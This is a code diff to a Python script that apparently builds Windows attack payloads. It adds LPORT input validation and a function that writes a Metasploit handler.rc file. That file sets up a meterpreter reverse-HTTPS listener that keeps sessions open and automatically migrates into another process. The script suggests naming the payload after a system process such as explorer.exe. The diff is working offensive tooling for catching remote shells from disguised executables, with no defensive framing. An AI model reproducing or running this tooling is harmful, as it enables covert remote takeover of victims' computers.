@@ -60,15 +60,36 @@ def get_user_ip():
 
 
 def get_user_target(lhost):
-    host_port = input("Enter your LPORT: ")
+    while True:
+        host_port = input("Enter your LPORT: ").strip()
+        if host_port.isdigit():
+            break
+        print("You must specify your LPORT as numbers.")
     payload_name = input("Enter your payload name(For example: explorer):\n")
     print(f"Setting LHOST to {lhost}")
     print(f"Setting LPORT to {host_port}")
     print(f"Setting payload name to: {payload_name}.exe")
+    return host_port , payload_name
+
+def metasploit_handler(lhost,lport):
+    print("Creating a handler file for Metasploit...")
+    metasploit_content = f"""
+    use exploit/multi/handler
+    set PAYLOAD windows/x64/meterpreter_reverse_https
+    set LHOST {lhost}
+    set LPORT {lport}
+    set ExitOnSession false
+    SessionCommunicationTimeout 0
+    set AutoRunScript post/windows/manage/migrate
+    exploit -j -z
+    """
+    with open("handler.rc","w") as f:
+        f.write(metasploit_content)
+    print("Successfully created a handler.rc file!")
 
 
 
-
-host_ip = get_user_ip()
-get_user_target(host_ip)
+lhost = get_user_ip()
+lport, payload_name = get_user_target(lhost)
+metasploit_handler(lhost, lport)
 
